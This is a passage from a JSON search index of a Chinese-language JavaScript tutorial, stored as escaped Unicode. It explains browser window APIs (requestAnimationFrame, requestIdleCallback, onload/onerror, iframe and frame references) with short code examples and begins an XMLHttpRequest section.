mediaQuery \u8bed\u53e5\uff0c\u8be6\u89c1\u300aCSS \u64cd\u4f5c\u300b\u4e00\u7ae0\u3002","title":"window.getComputedStyle()\uff0cwindow.matchMedia()"},{"location":"bom/window/#windowrequestanimationframe","text":"window.requestAnimationFrame() \u65b9\u6cd5\u8ddf setTimeout \u7c7b\u4f3c\uff0c\u90fd\u662f\u63a8\u8fdf\u67d0\u4e2a\u51fd\u6570\u7684\u6267\u884c\u3002\u4e0d\u540c\u4e4b\u5904\u5728\u4e8e\uff0c setTimeout \u5fc5\u987b\u6307\u5b9a\u63a8\u8fdf\u7684\u65f6\u95f4\uff0c window.requestAnimationFrame() \u5219\u662f\u63a8\u8fdf\u5230\u6d4f\u89c8\u5668\u4e0b\u4e00\u6b21\u91cd\u6d41\u65f6\u6267\u884c\uff0c\u6267\u884c\u5b8c\u624d\u4f1a\u8fdb\u884c\u4e0b\u4e00\u6b21\u91cd\u7ed8\u3002\u91cd\u7ed8\u901a\u5e38\u662f 16ms \u6267\u884c\u4e00\u6b21\uff0c\u4e0d\u8fc7\u6d4f\u89c8\u5668\u4f1a\u81ea\u52a8\u8c03\u8282\u8fd9\u4e2a\u901f\u7387\uff0c\u6bd4\u5982\u7f51\u9875\u5207\u6362\u5230\u540e\u53f0 Tab \u9875\u65f6\uff0c requestAnimationFrame() \u4f1a\u6682\u505c\u6267\u884c\u3002 \u5982\u679c\u67d0\u4e2a\u51fd\u6570\u4f1a\u6539\u53d8\u7f51\u9875\u7684\u5e03\u5c40\uff0c\u4e00\u822c\u5c31\u653e\u5728 window.requestAnimationFrame() \u91cc\u9762\u6267\u884c\uff0c\u8fd9\u6837\u53ef\u4ee5\u8282\u7701\u7cfb\u7edf\u8d44\u6e90\uff0c\u4f7f\u5f97\u7f51\u9875\u6548\u679c\u66f4\u52a0\u5e73\u6ed1\u3002\u56e0\u4e3a\u6162\u901f\u8bbe\u5907\u4f1a\u7528\u8f83\u6162\u7684\u901f\u7387\u91cd\u6d41\u548c\u91cd\u7ed8\uff0c\u800c\u901f\u5ea6\u66f4\u5feb\u7684\u8bbe\u5907\u4f1a\u6709\u66f4\u5feb\u7684\u901f\u7387\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u4f5c\u4e3a\u53c2\u6570\u3002 1 window . requestAnimationFrame ( callback ) \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c callback \u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002 callback \u6267\u884c\u65f6\uff0c\u5b83\u7684\u53c2\u6570\u5c31\u662f\u7cfb\u7edf\u4f20\u5165\u7684\u4e00\u4e2a\u9ad8\u7cbe\u5ea6\u65f6\u95f4\u6233\uff08 performance.now() \u7684\u8fd4\u56de\u503c\uff09\uff0c\u5355\u4f4d\u662f\u6beb\u79d2\uff0c\u8868\u793a\u8ddd\u79bb\u7f51\u9875\u52a0\u8f7d\u7684\u65f6\u95f4\u3002 window.requestAnimationFrame() \u7684\u8fd4\u56de\u503c\u662f\u4e00\u4e2a\u6574\u6570\uff0c\u8fd9\u4e2a\u6574\u6570\u53ef\u4ee5\u4f20\u5165 window.cancelAnimationFrame() \uff0c\u7528\u6765\u53d6\u6d88\u56de\u8c03\u51fd\u6570\u7684\u6267\u884c\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a window.requestAnimationFrame() \u6267\u884c\u7f51\u9875\u52a8\u753b\u7684\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 var element = document . getElementById ( 'animate' ); element . style . position = 'absolute' ; var start = null ; function step ( timestamp ) { if ( ! start ) start = timestamp ; var progress = timestamp - start ; // \u5143\u7d20\u4e0d\u65ad\u5411\u5de6\u79fb\uff0c\u6700\u5927\u4e0d\u8d85\u8fc7200\u50cf\u7d20 element . style . left = Math . min ( progress / 10 , 200 ) + 'px' ; // \u5982\u679c\u8ddd\u79bb\u7b2c\u4e00\u6b21\u6267\u884c\u4e0d\u8d85\u8fc7 2000 \u6beb\u79d2\uff0c // \u5c31\u7ee7\u7eed\u6267\u884c\u52a8\u753b if ( progress < 2000 ) { window . requestAnimationFrame ( step ); } } window . requestAnimationFrame ( step ); \u4e0a\u9762\u4ee3\u7801\u5b9a\u4e49\u4e86\u4e00\u4e2a\u7f51\u9875\u52a8\u753b\uff0c\u6301\u7eed\u65f6\u95f4\u662f2\u79d2\uff0c\u4f1a\u8ba9\u5143\u7d20\u5411\u53f3\u79fb\u52a8\u3002","title":"window.requestAnimationFrame()"},{"location":"bom/window/#windowrequestidlecallback","text":"window.requestIdleCallback() \u8ddf setTimeout \u7c7b\u4f3c\uff0c\u4e5f\u662f\u5c06\u67d0\u4e2a\u51fd\u6570\u63a8\u8fdf\u6267\u884c\uff0c\u4f46\u662f\u5b83\u4fdd\u8bc1\u5c06\u56de\u8c03\u51fd\u6570\u63a8\u8fdf\u5230\u7cfb\u7edf\u8d44\u6e90\u7a7a\u95f2\u65f6\u6267\u884c\u3002\u4e5f\u5c31\u662f\u8bf4\uff0c\u5982\u679c\u67d0\u4e2a\u4efb\u52a1\u4e0d\u662f\u5f88\u5173\u952e\uff0c\u5c31\u53ef\u4ee5\u4f7f\u7528 window.requestIdleCallback() \u5c06\u5176\u63a8\u8fdf\u6267\u884c\uff0c\u4ee5\u4fdd\u8bc1\u7f51\u9875\u6027\u80fd\u3002 \u5b83\u8ddf window.requestAnimationFrame() \u7684\u533a\u522b\u5728\u4e8e\uff0c\u540e\u8005\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u5728\u4e0b\u4e00\u6b21\u6d4f\u89c8\u5668\u91cd\u6392\u65f6\u6267\u884c\uff0c\u95ee\u9898\u5728\u4e8e\u4e0b\u4e00\u6b21\u91cd\u6392\u65f6\uff0c\u7cfb\u7edf\u8d44\u6e90\u672a\u5fc5\u7a7a\u95f2\uff0c\u4e0d\u4e00\u5b9a\u80fd\u4fdd\u8bc1\u572816\u6beb\u79d2\u4e4b\u5185\u5b8c\u6210\uff1b window.requestIdleCallback() \u53ef\u4ee5\u4fdd\u8bc1\u56de\u8c03\u51fd\u6570\u5728\u7cfb\u7edf\u8d44\u6e90\u7a7a\u95f2\u65f6\u6267\u884c\u3002 \u8be5\u65b9\u6cd5\u63a5\u53d7\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u548c\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002\u914d\u7f6e\u5bf9\u8c61\u53ef\u4ee5\u6307\u5b9a\u4e00\u4e2a\u63a8\u8fdf\u6267\u884c\u7684\u6700\u957f\u65f6\u95f4\uff0c\u5982\u679c\u8fc7\u4e86\u8fd9\u4e2a\u65f6\u95f4\uff0c\u56de\u8c03\u51fd\u6570\u4e0d\u7ba1\u7cfb\u7edf\u8d44\u6e90\u6709\u65e0\u7a7a\u95f2\uff0c\u90fd\u4f1a\u6267\u884c\u3002 1 window . requestIdleCallback ( callback [, options ]) callback \u53c2\u6570\u662f\u4e00\u4e2a\u56de\u8c03\u51fd\u6570\u3002\u8be5\u56de\u8c03\u51fd\u6570\u6267\u884c\u65f6\uff0c\u7cfb\u7edf\u4f1a\u4f20\u5165\u4e00\u4e2a IdleDeadline \u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\u3002 IdleDeadline \u5bf9\u8c61\u6709\u4e00\u4e2a didTimeout \u5c5e\u6027\uff08\u5e03\u5c14\u503c\uff0c\u8868\u793a\u662f\u5426\u4e3a\u8d85\u65f6\u8c03\u7528\uff09\u548c\u4e00\u4e2a timeRemaining() \u65b9\u6cd5\uff08\u8fd4\u56de\u8be5\u7a7a\u95f2\u65f6\u6bb5\u5269\u4f59\u7684\u6beb\u79d2\u6570\uff09\u3002 options \u53c2\u6570\u662f\u4e00\u4e2a\u914d\u7f6e\u5bf9\u8c61\uff0c\u76ee\u524d\u53ea\u6709 timeout \u4e00\u4e2a\u5c5e\u6027\uff0c\u7528\u6765\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u63a8\u8fdf\u6267\u884c\u7684\u6700\u5927\u6beb\u79d2\u6570\u3002\u8be5\u53c2\u6570\u53ef\u9009\u3002 window.requestIdleCallback() \u65b9\u6cd5\u8fd4\u56de\u4e00\u4e2a\u6574\u6570\u3002\u8be5\u6574\u6570\u53ef\u4ee5\u4f20\u5165 window.cancelIdleCallback() \u53d6\u6d88\u56de\u8c03\u51fd\u6570\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\u3002 1 2 3 4 5 6 7 requestIdleCallback ( myNonEssentialWork ); function myNonEssentialWork ( deadline ) { while ( deadline . timeRemaining () > 0 ) { doWorkIfNeeded (); } } \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c requestIdleCallback() \u7528\u6765\u6267\u884c\u975e\u5173\u952e\u4efb\u52a1 myNonEssentialWork \u3002\u8be5\u4efb\u52a1\u5148\u786e\u8ba4\u672c\u6b21\u7a7a\u95f2\u65f6\u6bb5\u6709\u5269\u4f59\u65f6\u95f4\uff0c\u7136\u540e\u624d\u771f\u6b63\u5f00\u59cb\u6267\u884c\u4efb\u52a1\u3002 \u4e0b\u9762\u662f\u6307\u5b9a timeout \u7684\u4f8b\u5b50\u3002 1 requestIdleCallback ( processPendingAnalyticsEvents , { timeout : 2000 }); \u4e0a\u9762\u4ee3\u7801\u6307\u5b9a\uff0c processPendingAnalyticsEvents \u5fc5\u987b\u5728\u672a\u67652\u79d2\u4e4b\u5185\u6267\u884c\u3002 \u5982\u679c\u7531\u4e8e\u8d85\u65f6\u5bfc\u81f4\u56de\u8c03\u51fd\u6570\u6267\u884c\uff0c\u5219 deadline.timeRemaining() \u8fd4\u56de 0 \uff0c deadline.didTimeout \u8fd4\u56de true \u3002 \u5982\u679c\u591a\u6b21\u6267\u884c window.requestIdleCallback() \uff0c\u6307\u5b9a\u591a\u4e2a\u56de\u8c03\u51fd\u6570\uff0c\u90a3\u4e48\u8fd9\u4e9b\u56de\u8c03\u51fd\u6570\u5c06\u6392\u6210\u4e00\u4e2a\u961f\u5217\uff0c\u6309\u7167\u5148\u8fdb\u5148\u51fa\u7684\u987a\u5e8f\u6267\u884c\u3002","title":"window.requestIdleCallback()"},{"location":"bom/window/#_5","text":"window \u5bf9\u8c61\u53ef\u4ee5\u63a5\u6536\u4ee5\u4e0b\u4e8b\u4ef6\u3002","title":"\u4e8b\u4ef6"},{"location":"bom/window/#load-onload","text":"load \u4e8b\u4ef6\u53d1\u751f\u5728\u6587\u6863\u5728\u6d4f\u89c8\u5668\u7a97\u53e3\u52a0\u8f7d\u5b8c\u6bd5\u65f6\u3002 window.onload \u5c5e\u6027\u53ef\u4ee5\u6307\u5b9a\u8fd9\u4e2a\u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u3002 1 2 3 4 5 6 7 window . onload = function () { var elements = document . getElementsByClassName ( 'example' ); for ( var i = 0 ; i < elements . length ; i ++ ) { var elt = elements [ i ]; // ... } }; \u4e0a\u9762\u4ee3\u7801\u5728\u7f51\u9875\u52a0\u8f7d\u5b8c\u6bd5\u540e\uff0c\u83b7\u53d6\u6307\u5b9a\u5143\u7d20\u5e76\u8fdb\u884c\u5904\u7406\u3002","title":"load \u4e8b\u4ef6\u548c onload \u5c5e\u6027"},{"location":"bom/window/#error-onerror","text":"\u6d4f\u89c8\u5668\u811a\u672c\u53d1\u751f\u9519\u8bef\u65f6\uff0c\u4f1a\u89e6\u53d1 window \u5bf9\u8c61\u7684 error \u4e8b\u4ef6\u3002\u6211\u4eec\u53ef\u4ee5\u901a\u8fc7 window.onerror \u5c5e\u6027\u5bf9\u8be5\u4e8b\u4ef6\u6307\u5b9a\u56de\u8c03\u51fd\u6570\u3002 1 2 3 window . onerror = function ( message , filename , lineno , colno , error ) { console . log ( \"\u51fa\u9519\u4e86\uff01--> %s\" , error . stack ); }; \u7531\u4e8e\u5386\u53f2\u539f\u56e0\uff0c window \u7684 error \u4e8b\u4ef6\u7684\u56de\u8c03\u51fd\u6570\u4e0d\u63a5\u53d7\u9519\u8bef\u5bf9\u8c61\u4f5c\u4e3a\u53c2\u6570\uff0c\u800c\u662f\u4e00\u5171\u53ef\u4ee5\u63a5\u53d7\u4e94\u4e2a\u53c2\u6570\uff0c\u5b83\u4eec\u7684\u542b\u4e49\u4f9d\u6b21\u5982\u4e0b\u3002 \u51fa\u9519\u4fe1\u606f \u51fa\u9519\u811a\u672c\u7684\u7f51\u5740 \u884c\u53f7 \u5217\u53f7 \u9519\u8bef\u5bf9\u8c61 \u8001\u5f0f\u6d4f\u89c8\u5668\u53ea\u652f\u6301\u524d\u4e09\u4e2a\u53c2\u6570\u3002 \u5e76\u4e0d\u662f\u6240\u6709\u7684\u9519\u8bef\uff0c\u90fd\u4f1a\u89e6\u53d1 JavaScript \u7684 error \u4e8b\u4ef6\uff08\u5373\u8ba9 JavaScript \u62a5\u9519\uff09\u3002\u4e00\u822c\u6765\u8bf4\uff0c\u53ea\u6709 JavaScript \u811a\u672c\u7684\u9519\u8bef\uff0c\u624d\u4f1a\u89e6\u53d1\u8fd9\u4e2a\u4e8b\u4ef6\uff0c\u800c\u50cf\u8d44\u6e90\u6587\u4ef6\u4e0d\u5b58\u5728\u4e4b\u7c7b\u7684\u9519\u8bef\uff0c\u90fd\u4e0d\u4f1a\u89e6\u53d1\u3002 \u4e0b\u9762\u662f\u4e00\u4e2a\u4f8b\u5b50\uff0c\u5982\u679c\u6574\u4e2a\u9875\u9762\u672a\u6355\u83b7\u9519\u8bef\u8d85\u8fc73\u4e2a\uff0c\u5c31\u663e\u793a\u8b66\u544a\u3002 1 2 3 4 5 6 7 8 window . onerror = function ( msg , url , line ) { if ( onerror . num ++ > onerror . max ) { alert ( 'ERROR: ' + msg + '\\n' + url + ':' + line ); return true ; } } onerror . max = 3 ; onerror . num = 0 ; \u9700\u8981\u6ce8\u610f\u7684\u662f\uff0c\u5982\u679c\u811a\u672c\u7f51\u5740\u4e0e\u7f51\u9875\u7f51\u5740\u4e0d\u5728\u540c\u4e00\u4e2a\u57df\uff08\u6bd4\u5982\u4f7f\u7528\u4e86 CDN\uff09\uff0c\u6d4f\u89c8\u5668\u6839\u672c\u4e0d\u4f1a\u63d0\u4f9b\u8be6\u7ec6\u7684\u51fa\u9519\u4fe1\u606f\uff0c\u53ea\u4f1a\u63d0\u793a\u51fa\u9519\uff0c\u9519\u8bef\u7c7b\u578b\u662f\u201cScript error.\u201d\uff0c\u884c\u53f7\u4e3a0\uff0c\u5176\u4ed6\u4fe1\u606f\u90fd\u6ca1\u6709\u3002\u8fd9\u662f\u6d4f\u89c8\u5668\u9632\u6b62\u5411\u5916\u90e8\u811a\u672c\u6cc4\u6f0f\u4fe1\u606f\u3002\u4e00\u4e2a\u89e3\u51b3\u65b9\u6cd5\u662f\u5728\u811a\u672c\u6240\u5728\u7684\u670d\u52a1\u5668\uff0c\u8bbe\u7f6e Access-Control-Allow-Origin \u7684 HTTP \u5934\u4fe1\u606f\u3002 1 Access-Control-Allow-Origin: * \u7136\u540e\uff0c\u5728\u7f51\u9875\u7684 <script> \u6807\u7b7e\u4e2d\u8bbe\u7f6e crossorigin \u5c5e\u6027\u3002 1 < script crossorigin = \"anonymous\" src = \"//example.com/file.js\" ></ script > \u4e0a\u9762\u4ee3\u7801\u7684 crossorigin=\"anonymous\" \u8868\u793a\uff0c\u8bfb\u53d6\u6587\u4ef6\u4e0d\u9700\u8981\u8eab\u4efd\u4fe1\u606f\uff0c\u5373\u4e0d\u9700\u8981 cookie \u548c HTTP \u8ba4\u8bc1\u4fe1\u606f\u3002\u5982\u679c\u8bbe\u4e3a crossorigin=\"use-credentials\" \uff0c\u5c31\u8868\u793a\u6d4f\u89c8\u5668\u4f1a\u4e0a\u4f20 cookie \u548c HTTP \u8ba4\u8bc1\u4fe1\u606f\uff0c\u540c\u65f6\u8fd8\u9700\u8981\u670d\u52a1\u5668\u7aef\u6253\u5f00 HTTP \u5934\u4fe1\u606f Access-Control-Allow-Credentials \u3002","title":"error \u4e8b\u4ef6\u548c onerror \u5c5e\u6027"},{"location":"bom/window/#window_3","text":"\u9664\u4e86\u5177\u5907\u5143\u7d20\u8282\u70b9\u90fd\u6709\u7684 GlobalEventHandlers \u63a5\u53e3\uff0c window \u5bf9\u8c61\u8fd8\u5177\u6709\u4ee5\u4e0b\u7684\u4e8b\u4ef6\u76d1\u542c\u51fd\u6570\u5c5e\u6027\u3002 window.onafterprint \uff1a afterprint \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onbeforeprint \uff1a beforeprint \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onbeforeunload \uff1a beforeunload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onhashchange \uff1a hashchange \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onlanguagechange : languagechange \u7684\u76d1\u542c\u51fd\u6570\u3002 window.onmessage \uff1a message \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onmessageerror \uff1a MessageError \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onoffline \uff1a offline \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.ononline \uff1a online \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpagehide \uff1a pagehide \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpageshow \uff1a pageshow \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onpopstate \uff1a popstate \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onstorage \uff1a storage \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onunhandledrejection \uff1a\u672a\u5904\u7406\u7684 Promise \u5bf9\u8c61\u7684 reject \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002 window.onunload \uff1a unload \u4e8b\u4ef6\u7684\u76d1\u542c\u51fd\u6570\u3002","title":"window \u5bf9\u8c61\u7684\u4e8b\u4ef6\u76d1\u542c\u5c5e\u6027"},{"location":"bom/window/#_6","text":"\u7531\u4e8e\u7f51\u9875\u53ef\u4ee5\u4f7f\u7528 iframe \u5143\u7d20\uff0c\u5d4c\u5165\u5176\u4ed6\u7f51\u9875\uff0c\u56e0\u6b64\u4e00\u4e2a\u7f51\u9875\u4e4b\u4e2d\u4f1a\u5f62\u6210\u591a\u4e2a\u7a97\u53e3\u3002\u5982\u679c\u5b50\u7a97\u53e3\u4e4b\u4e2d\u53c8\u5d4c\u5165\u522b\u7684\u7f51\u9875\uff0c\u5c31\u4f1a\u5f62\u6210\u591a\u7ea7\u7a97\u53e3\u3002","title":"\u591a\u7a97\u53e3\u64cd\u4f5c"},{"location":"bom/window/#_7","text":"\u5404\u4e2a\u7a97\u53e3\u4e4b\u4e2d\u7684\u811a\u672c\uff0c\u53ef\u4ee5\u5f15\u7528\u5176\u4ed6\u7a97\u53e3\u3002\u6d4f\u89c8\u5668\u63d0\u4f9b\u4e86\u4e00\u4e9b\u7279\u6b8a\u53d8\u91cf\uff0c\u7528\u6765\u8fd4\u56de\u5176\u4ed6\u7a97\u53e3\u3002 top \uff1a\u9876\u5c42\u7a97\u53e3\uff0c\u5373\u6700\u4e0a\u5c42\u7684\u90a3\u4e2a\u7a97\u53e3 parent \uff1a\u7236\u7a97\u53e3 self \uff1a\u5f53\u524d\u7a97\u53e3\uff0c\u5373\u81ea\u8eab \u4e0b\u9762\u4ee3\u7801\u53ef\u4ee5\u5224\u65ad\uff0c\u5f53\u524d\u7a97\u53e3\u662f\u5426\u4e3a\u9876\u5c42\u7a97\u53e3\u3002 1 2 3 4 5 if ( window . top === window . self ) { // \u5f53\u524d\u7a97\u53e3\u662f\u9876\u5c42\u7a97\u53e3 } else { // \u5f53\u524d\u7a97\u53e3\u662f\u5b50\u7a97\u53e3 } \u4e0b\u9762\u7684\u4ee3\u7801\u8ba9\u7236\u7a97\u53e3\u7684\u8bbf\u95ee\u5386\u53f2\u540e\u9000\u4e00\u6b21\u3002 1 window . parent . history . back (); \u4e0e\u8fd9\u4e9b\u53d8\u91cf\u5bf9\u5e94\uff0c\u6d4f\u89c8\u5668\u8fd8\u63d0\u4f9b\u4e00\u4e9b\u7279\u6b8a\u7684\u7a97\u53e3\u540d\uff0c\u4f9b window.open() \u65b9\u6cd5\u3001 <a> \u6807\u7b7e\u3001 <form> \u6807\u7b7e\u7b49\u5f15\u7528\u3002 _top \uff1a\u9876\u5c42\u7a97\u53e3 _parent \uff1a\u7236\u7a97\u53e3 _blank \uff1a\u65b0\u7a97\u53e3 \u4e0b\u9762\u4ee3\u7801\u5c31\u8868\u793a\u5728\u9876\u5c42\u7a97\u53e3\u6253\u5f00\u94fe\u63a5\u3002 1 < a href = \"somepage.html\" target = \"_top\" > Link </ a >","title":"\u7a97\u53e3\u7684\u5f15\u7528"},{"location":"bom/window/#iframe","text":"\u5bf9\u4e8e iframe \u5d4c\u5165\u7684\u7a97\u53e3\uff0c document.getElementById \u65b9\u6cd5\u53ef\u4ee5\u62ff\u5230\u8be5\u7a97\u53e3\u7684 DOM \u8282\u70b9\uff0c\u7136\u540e\u4f7f\u7528 contentWindow \u5c5e\u6027\u83b7\u5f97 iframe \u8282\u70b9\u5305\u542b\u7684 window \u5bf9\u8c61\u3002 1 2 var frame = document . getElementById ( 'theFrame' ); var frameWindow = frame . contentWindow ; \u4e0a\u9762\u4ee3\u7801\u4e2d\uff0c frame.contentWindow \u53ef\u4ee5\u62ff\u5230\u5b50\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002\u7136\u540e\uff0c\u5728\u6ee1\u8db3\u540c\u6e90\u9650\u5236\u7684\u60c5\u51b5\u4e0b\uff0c\u53ef\u4ee5\u8bfb\u53d6\u5b50\u7a97\u53e3\u5185\u90e8\u7684\u5c5e\u6027\u3002 1 2 // \u83b7\u53d6\u5b50\u7a97\u53e3\u7684\u6807\u9898 frameWindow . title <iframe> \u5143\u7d20\u7684 contentDocument \u5c5e\u6027\uff0c\u53ef\u4ee5\u62ff\u5230\u5b50\u7a97\u53e3\u7684 document \u5bf9\u8c61\u3002 1 2 3 4 5 var frame = document . getElementById ( 'theFrame' ); var frameDoc = frame . contentDocument ; // \u7b49\u540c\u4e8e var frameDoc = frame . contentWindow . document ; <iframe> \u5143\u7d20\u9075\u5b88\u540c\u6e90\u653f\u7b56\uff0c\u53ea\u6709\u5f53\u7236\u7a97\u53e3\u4e0e\u5b50\u7a97\u53e3\u5728\u540c\u4e00\u4e2a\u57df\u65f6\uff0c\u4e24\u8005\u4e4b\u95f4\u624d\u53ef\u4ee5\u7528\u811a\u672c\u901a\u4fe1\uff0c\u5426\u5219\u53ea\u6709\u4f7f\u7528 window.postMessage \u65b9\u6cd5\u3002 <iframe> \u7a97\u53e3\u5185\u90e8\uff0c\u4f7f\u7528 window.parent \u5f15\u7528\u7236\u7a97\u53e3\u3002\u5982\u679c\u5f53\u524d\u9875\u9762\u6ca1\u6709\u7236\u7a97\u53e3\uff0c\u5219 window.parent \u5c5e\u6027\u8fd4\u56de\u81ea\u8eab\u3002\u56e0\u6b64\uff0c\u53ef\u4ee5\u901a\u8fc7 window.parent \u662f\u5426\u7b49\u4e8e window.self \uff0c\u5224\u65ad\u5f53\u524d\u7a97\u53e3\u662f\u5426\u4e3a iframe \u7a97\u53e3\u3002 1 2 3 if ( window . parent !== window . self ) { // \u5f53\u524d\u7a97\u53e3\u662f\u5b50\u7a97\u53e3 } <iframe> \u7a97\u53e3\u7684 window \u5bf9\u8c61\uff0c\u6709\u4e00\u4e2a frameElement \u5c5e\u6027\uff0c\u8fd4\u56de <iframe> \u5728\u7236\u7a97\u53e3\u4e2d\u7684 DOM \u8282\u70b9\u3002\u5bf9\u4e8e\u975e\u5d4c\u5165\u7684\u7a97\u53e3\uff0c\u8be5\u5c5e\u6027\u7b49\u4e8e null \u3002 1 2 3 4 5 var f1Element = document . getElementById ( 'f1' ); var f1Window = f1Element . contentWindow ; f1Window . frameElement === f1Element // true window . frameElement === null // true","title":"iframe \u5143\u7d20"},{"location":"bom/window/#windowframes","text":"window.frames \u5c5e\u6027\u8fd4\u56de\u4e00\u4e2a\u7c7b\u4f3c\u6570\u7ec4\u7684\u5bf9\u8c61\uff0c\u6210\u5458\u662f\u6240\u6709\u5b50\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002\u53ef\u4ee5\u4f7f\u7528\u8fd9\u4e2a\u5c5e\u6027\uff0c\u5b9e\u73b0\u7a97\u53e3\u4e4b\u95f4\u7684\u4e92\u76f8\u5f15\u7528\u3002\u6bd4\u5982\uff0c frames[0] \u8fd4\u56de\u7b2c\u4e00\u4e2a\u5b50\u7a97\u53e3\uff0c frames[1].frames[2] \u8fd4\u56de\u7b2c\u4e8c\u4e2a\u5b50\u7a97\u53e3\u5185\u90e8\u7684\u7b2c\u4e09\u4e2a\u5b50\u7a97\u53e3\uff0c parent.frames[1] \u8fd4\u56de\u7236\u7a97\u53e3\u7684\u7b2c\u4e8c\u4e2a\u5b50\u7a97\u53e3\u3002 \u6ce8\u610f\uff0c window.frames \u6bcf\u4e2a\u6210\u5458\u7684\u503c\uff0c\u662f\u6846\u67b6\u5185\u7684\u7a97\u53e3\uff08\u5373\u6846\u67b6\u7684 window \u5bf9\u8c61\uff09\uff0c\u800c\u4e0d\u662f iframe \u6807\u7b7e\u5728\u7236\u7a97\u53e3\u7684 DOM \u8282\u70b9\u3002\u5982\u679c\u8981\u83b7\u53d6\u6bcf\u4e2a\u6846\u67b6\u5185\u90e8\u7684 DOM \u6811\uff0c\u9700\u8981\u4f7f\u7528 window.frames[0].document \u7684\u5199\u6cd5\u3002 \u53e6\u5916\uff0c\u5982\u679c <iframe> \u5143\u7d20\u8bbe\u7f6e\u4e86 name \u6216 id \u5c5e\u6027\uff0c\u90a3\u4e48\u5c5e\u6027\u503c\u4f1a\u81ea\u52a8\u6210\u4e3a\u5168\u5c40\u53d8\u91cf\uff0c\u5e76\u4e14\u53ef\u4ee5\u901a\u8fc7 window.frames \u5c5e\u6027\u5f15\u7528\uff0c\u8fd4\u56de\u5b50\u7a97\u53e3\u7684 window \u5bf9\u8c61\u3002 1 2 3 // HTML \u4ee3\u7801\u4e3a <iframe id=\"myFrame\"> window . myFrame // [HTMLIFrameElement] frames . myframe === myFrame // true \u53e6\u5916\uff0c name \u5c5e\u6027\u7684\u503c\u4f1a\u81ea\u52a8\u6210\u4e3a\u5b50\u7a97\u53e3\u7684\u540d\u79f0\uff0c\u53ef\u4ee5\u7528\u5728 window.open \u65b9\u6cd5\u7684\u7b2c\u4e8c\u4e2a\u53c2\u6570\uff0c\u6216\u8005 <a> \u548c <frame> \u6807\u7b7e\u7684 target \u5c5e\u6027\u3002","title":"window.frames \u5c5e\u6027"},{"location":"bom/xmlhttprequest/","text":"XMLHttpRequest \u5bf9\u8c61 \u00b6 \u7b80\u4ecb \u00b6 \u6d4f\u89c8\u5668\u4e0e\u670d\u52a1\u5668\u4e4b\u95f4\uff0c\u91c7\u7528 HTTP \u534f\u8bae\u901a\u4fe1\u3002\u7528\u6237\u5728\u6d4f\u89c8\u5668\u5730\u5740\u680f\u952e\u5165\u4e00\u4e2a\u7f51\u5740\uff0c\u6216\u8005\u901a\u8fc7\u7f51\u9875\u8868\u5355\u5411\u670d\u52a1\u5668\u63d0\u4ea4\u5185\u5bb9\uff0c\u8fd9\u65f6\u6d4f\u89c8\u5668\u5c31\u4f1a\u5411\u670d\u52a1\u5668\u53d1\u51fa HTTP \u8bf7\u6c42\u3002 1999\u5e74\uff0c\u5fae\u8f6f\u516c\u53f8\u53d1\u5e03 IE \u6d4f\u89c8\u56685.0\u7248\uff0c\u7b2c\u4e00\u6b21\u5f15\u5165\u65b0\u529f\u80fd\uff1a\u5141\u8bb8 JavaScript \u811a\u672c\u5411\u670d\u52a1\u5668\u53d1\u8d77 HTTP \u8bf7\u6c42\u3002\u8fd9\u4e2a\u529f\u80fd\u5f53\u65f6\u5e76\u6ca1\u6709\u5f15\u8d77\u6ce8\u610f\uff0c\u76f4\u52302004\u5e74 Gmail \u53d1\u5e03\u548c2005\u5e74 Google Map \u53d1\u5e03\uff0c\u624d\u5f15\u8d77\u5e7f\u6cdb\u91cd\u89c6\u30022005\u5e742\u6708\uff0cAJAX \u8fd9\u4e2a\u8bcd\u7b2c\u4e00\u6b21\u6b63\u5f0f\u63d0\u51fa\uff0c\u5b83\u662f Asynchronous JavaScript and XML \u7684\u7f29\u5199\uff0c\u6307\u7684\u662f\u901a\u8fc7 JavaScript \u7684\u5f02\u6b65\u901a\u4fe1\uff0c\u4ece\u670d\u52a1\u5668\u83b7\u53d6 XML \u6587\u6863\u4ece\u4e2d\u63d0\u53d6\u6570\u636e\uff0c\u518d\u66f4\u65b0\u5f53\u524d\u7f51\u9875\u7684\u5bf9\u5e94\u90e8\u5206\uff0c\u800c\u4e0d\u7528\u5237\u65b0\u6574\u4e2a\u7f51\u9875\u3002\u540e\u6765\uff0cAJAX \u8fd9\u4e2a\u8bcd\u5c31\u6210\u4e3a JavaScript \u811a\u672c\u53d1\u8d77 HTTP \u901a\u4fe1\u7684\u4ee3\u540d\u8bcd\uff0c\u4e5f\u5c31\u662f\u8bf4\uff0c\u53ea\u8981\u7528\u811a\u672c\u53d1\u8d77\u901a\u4fe1\uff0c\u5c31\u53ef\u4ee5\u53eb\u505a AJAX \u901a\u4fe1\u3002W3C 